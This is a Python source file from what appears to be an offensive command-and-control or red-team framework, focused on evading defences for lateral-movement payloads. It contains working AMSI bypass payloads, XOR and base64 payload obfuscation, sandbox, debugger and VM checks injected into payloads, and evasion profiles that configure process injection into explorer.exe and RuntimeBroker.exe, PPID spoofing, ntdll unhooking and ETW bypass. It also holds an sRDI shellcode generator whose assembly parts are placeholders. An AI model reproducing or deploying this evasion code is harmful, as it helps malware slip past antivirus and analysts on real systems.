    def _wrap_with_amsi_bypass(self, payload: bytes, beacon_type: str) -> bytes:
        """Wrap payload with AMSI bypass"""
        
        if beacon_type != "powershell":
            return payload
        
        amsi_bypass = b'''
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
'''
        return amsi_bypass + b"\n" + payload
    
    def _encrypt_payload(self, payload: bytes, key: str) -> bytes:
        """Encrypt payload with XOR"""
        key_bytes = key.encode()
        encrypted = bytearray()
        for i, byte in enumerate(payload):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        
        # Return base64 encoded with decryption stub
        encoded = base64.b64encode(bytes(encrypted)).decode()
        return f"KEY={key};DATA={encoded}".encode()
    
    def _wrap_with_reflective_loader(self, payload: bytes) -> bytes:
        """Wrap payload with reflective loader stub"""
        
        if not self.reflective_loader:
            return payload
        
        try:
            return self.reflective_loader.wrap_payload(payload)
        except Exception:
            return payload
    
    def _add_anti_analysis(self, payload: bytes, beacon_type: str) -> bytes:
        """Add anti-analysis checks to payload"""
        
        anti_analysis = b'''
# Anti-analysis checks
import os, sys, time
def check_env():
    # Check for common sandbox indicators
    sandbox_indicators = ['sandbox', 'virus', 'malware', 'sample', 'test']
    username = os.environ.get('USERNAME', '').lower()
    if any(ind in username for ind in sandbox_indicators):
        sys.exit(0)
    # Check for debugger
    if sys.gettrace():
        sys.exit(0)
    # Check system uptime (sandboxes often have low uptime)
    try:
        import psutil
        if psutil.boot_time() > time.time() - 600:  # Less than 10 min
            time.sleep(660)  # Wait it out
    except:
        pass
    return True

if not check_env():
    sys.exit(0)

'''
        if beacon_type == "python":
            return anti_analysis + payload
        return payload
    
    def _get_amsi_bypass_oneliner(self) -> str:
        """Get AMSI bypass one-liner for command injection"""
        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    
    def _obfuscate_command(self, command: str) -> str:
        """Basic command obfuscation"""
        # Simple base64 encoding for PowerShell
        if "powershell" in command.lower():
            encoded = base64.b64encode(command.encode('utf-16-le')).decode()
            return f"powershell -enc {encoded}"
        return command
    
    def _detect_sandbox(self) -> bool:
        """Detect sandbox environment"""
        import os
        
        indicators = [
            os.path.exists("/tmp/sandbox"),
            os.environ.get("SANDBOX", "") == "1",
            "sandbox" in os.environ.get("USERNAME", "").lower(),
        ]
        return any(indicators)
    
    def _detect_debugger(self) -> bool:
        """Detect debugger presence"""
        import sys
        return sys.gettrace() is not None
    
    def _detect_vm(self) -> bool:
        """Detect virtual machine"""
        import subprocess
        
        try:
            # Check for VM indicators in DMI
            output = subprocess.check_output(
                ["dmidecode", "-s", "system-manufacturer"],
                stderr=subprocess.DEVNULL,
                timeout=5
            ).decode().lower()
            
            vm_indicators = ["vmware", "virtualbox", "qemu", "xen", "hyper-v"]
            return any(ind in output for ind in vm_indicators)
        except Exception:
            return False
    
    def _log(self, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, "LATERAL_EVASION", message)
        print(f"[LATERAL_EVASION] {message}")


def get_evasion_config_for_profile(profile: str) -> EvasionConfig:
    """
    Get EvasionConfig for a named profile
    Enhanced with sRDI, process hollowing/doppelganging, entropy-based sleep
    """
    
    profile_enum = EvasionProfile(profile.lower())
    
    if profile_enum == EvasionProfile.NONE:
        return EvasionConfig(
            profile=EvasionProfile.NONE,
            use_reflective_loader=False,
            use_process_injection=False,
            bypass_amsi=False,
            bypass_etw=False,
            use_sleep_obfuscation=False,
            entropy_jitter=False,
            reencrypt_on_wake=False,
            detect_sandbox=False,
            detect_debugger=False,
            check_vm=False
        )
    
    elif profile_enum == EvasionProfile.DEFAULT:
        return EvasionConfig(
            profile=EvasionProfile.DEFAULT,
            use_reflective_loader=False,
            use_process_injection=True,
            injection_technique="apc_injection",
            target_process="explorer.exe",
            bypass_amsi=True,
            amsi_technique="patch_amsi_init",
            bypass_etw=False,
            unhook_ntdll=False,
            use_sleep_obfuscation=False,
            jitter_percent=0.1,
            entropy_jitter=False,
            reencrypt_on_wake=False,
            encryption_algorithm="xor"
        )
    
    elif profile_enum == EvasionProfile.STEALTH:
        return EvasionConfig(
            profile=EvasionProfile.STEALTH,
            # sRDI reflective loader (Cobalt Strike 4.11 style)
            use_reflective_loader=True,
            reflective_technique="srdi",
            srdi_obfuscate_imports=True,
            srdi_clear_header=True,
            prepend_migrate=True,
            # Thread hijacking injection
            use_process_injection=True,
            injection_technique="thread_hijacking",
            target_process="explorer.exe",
            syscall_mode="indirect",
            # Security bypass
            bypass_amsi=True,
            amsi_technique="hardware_breakpoint",
            bypass_etw=True,
            unhook_ntdll=False,
            # Sleep with entropy
            use_sleep_obfuscation=True,
            sleep_technique="ekko",
            jitter_percent=0.3,
            entropy_jitter=True,
            entropy_pool_size=64,
            reencrypt_on_wake=True,
            min_sleep_ms=2000,
            max_sleep_ms=8000,
            # Anti-analysis
            detect_sandbox=True,
            detect_debugger=True,
            check_vm=False,
            encryption_algorithm="aes256"
        )
    
    elif profile_enum == EvasionProfile.PARANOID:
        return EvasionConfig(
            profile=EvasionProfile.PARANOID,
            # Advanced reflective loader with PE stomping
            use_reflective_loader=True,
            reflective_technique="srdi",
            srdi_obfuscate_imports=True,
            srdi_clear_header=True,
            srdi_stomp_pe=True,
            prepend_migrate=True,
            # Process hollowing/doppelganging
            use_process_injection=True,
            injection_technique="early_bird",
            target_process="RuntimeBroker.exe",
            fallback_processes=["SearchProtocolHost.exe", "backgroundTaskHost.exe"],
            use_process_hollowing=True,
            use_doppelganging=True,
            use_ghosting=True,
            ppid_spoof=True,
            ppid_target="services.exe",
            syscall_mode="direct",
            # Full security bypass
            bypass_amsi=True,
            amsi_technique="hardware_breakpoint",
            bypass_etw=True,
            unhook_ntdll=True,
            unhook_technique="map_fresh_ntdll",
            # Maximum sleep obfuscation with entropy
            use_sleep_obfuscation=True,
            sleep_technique="death_sleep",
            jitter_percent=0.5,
            entropy_jitter=True,
            entropy_pool_size=128,
            use_hardware_entropy=True,
            reencrypt_on_wake=True,
            memory_guard_on_sleep=True,
            min_sleep_ms=5000,
            max_sleep_ms=30000,
            # Maximum anti-analysis
            detect_sandbox=True,
            detect_debugger=True,
            check_vm=True,
            exit_on_detection=True,
            encryption_algorithm="chacha20",
            key_rotation_interval=900
        )
    
    elif profile_enum == EvasionProfile.AGGRESSIVE:
        return EvasionConfig(
            profile=EvasionProfile.AGGRESSIVE,
            # Basic sRDI without PE stomping
            use_reflective_loader=True,
            reflective_technique="srdi",
            srdi_obfuscate_imports=True,
            srdi_clear_header=False,
            prepend_migrate=False,
            # Fast APC injection
            use_process_injection=True,
            injection_technique="apc_injection",
            target_process="explorer.exe",
            syscall_mode="ntdll",
            # Essential bypass only
            bypass_amsi=True,
            amsi_technique="patch_amsi_init",
            bypass_etw=False,
            unhook_ntdll=False,
            # Minimal sleep
            use_sleep_obfuscation=False,
            jitter_percent=0.15,
            entropy_jitter=False,
            reencrypt_on_wake=False,
            min_sleep_ms=500,
            max_sleep_ms=2000,
            # No anti-analysis (speed)
            detect_sandbox=False,
            detect_debugger=False,
            check_vm=False,
            encryption_algorithm="xor"
        )
    
    return EvasionConfig()


class SRDIGenerator:
    """
    Shellcode Reflective DLL Injection (sRDI) Generator
    Converts DLL to position-independent shellcode
    Inspired by Cobalt Strike 4.11 prepend/sRDI style
    """
    
    def __init__(self, config: EvasionConfig):
        self.config = config
    
    def generate_srdi_shellcode(self, dll_bytes: bytes, function_name: str = "DllMain") -> bytes:
        """
        Convert DLL to sRDI shellcode
        
        Args:
            dll_bytes: Raw DLL bytes
            function_name: Export to call after loading
        
        Returns:
            Position-independent shellcode
        """
        self._log("Generating sRDI shellcode")
        
        # sRDI Header (bootstrap)
        srdi_header = self._generate_bootstrap()
        
        # Obfuscate imports if configured
        if self.config.srdi_obfuscate_imports:
            dll_bytes = self._obfuscate_imports(dll_bytes)
        
        # Clear PE header if configured
        if self.config.srdi_clear_header:
            dll_bytes = self._clear_pe_header(dll_bytes)
        
        # XOR encode the DLL
        key = secrets.token_bytes(16)
        encoded_dll = self._xor_encode(dll_bytes, key)
        
        # Build final shellcode
        shellcode = b""
        
        # Prepend migrate stub if configured (Cobalt Strike style)
        if self.config.prepend_migrate:
            shellcode += self._generate_migrate_stub()
        
        shellcode += srdi_header
        shellcode += struct.pack("<I", len(encoded_dll))
        shellcode += key
        shellcode += encoded_dll
        
        return shellcode
    
    def _generate_bootstrap(self) -> bytes:
        """Generate position-independent bootstrap code"""
        # This would be actual assembly in production
        # Simplified placeholder
        bootstrap = b"\x90" * 32  # NOP sled
        bootstrap += b"\xcc"      # INT3 placeholder
        return bootstrap
    
    def _generate_migrate_stub(self) -> bytes:
        """Generate Cobalt Strike-style migrate stub"""
        # Stub that handles process migration
        migrate_stub = b"\x90" * 16
        return migrate_stub
    
    def _obfuscate_imports(self, dll_bytes: bytes) -> bytes:
        """Obfuscate import table to evade static analysis"""
        # Would modify IAT in production
        return dll_bytes
    
    def _clear_pe_header(self, dll_bytes: bytes) -> bytes:
        """Clear PE header fields to evade memory scanning"""
        if len(dll_bytes) < 64:
            return dll_bytes
        
        # Clear DOS header signature in copy
        modified = bytearray(dll_bytes)
        modified[0:2] = b"\x00\x00"  # Clear MZ
        
        return bytes(modified)
    
    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
        """XOR encode data with key"""
        encoded = bytearray()
        for i, byte in enumerate(data):
            encoded.append(byte ^ key[i % len(key)])
        return bytes(encoded)
    
    def _log(self, message: str):
        print(f"[SRDI] {message}")
